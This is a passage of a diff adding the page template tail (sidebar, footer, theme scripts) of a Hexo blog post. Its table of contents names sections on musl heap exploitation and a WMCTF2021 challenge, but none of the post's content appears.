+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xxy1126" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1335926819@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%9F%BA%E7%A1%80%E7%BB%93%E6%9E%84%E5%92%8C%E5%AE%9A%E4%B9%89"><span class="nav-number">1.</span> <span class="nav-text">0x01.基础结构和定义</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-malloc"><span class="nav-number">2.</span> <span class="nav-text">0x02.malloc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-free"><span class="nav-number">3.</span> <span class="nav-text">0x03.free</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">4.</span> <span class="nav-text">0x04.利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0401-unbin"><span class="nav-number">4.1.</span> <span class="nav-text">0x0401.unbin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0402-%E5%88%A9%E7%94%A8exit%E4%B8%AD-funcs-on-exit"><span class="nav-number">4.2.</span> <span class="nav-text">0x0402.利用exit中__funcs_on_exit()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0403-%E5%88%A9%E7%94%A8exit%E4%B8%AD-stdio-exit"><span class="nav-number">4.3.</span> <span class="nav-text">0x0403.利用exit中__stdio_exit()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-%E4%BE%8B%E9%A2%98"><span class="nav-number">5.</span> <span class="nav-text">0x05.例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0501-WMCTF2021Nescafe"><span class="nav-number">5.1.</span> <span class="nav-text">0x0501.WMCTF2021Nescafe</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">0x06.参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tm0tfl</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
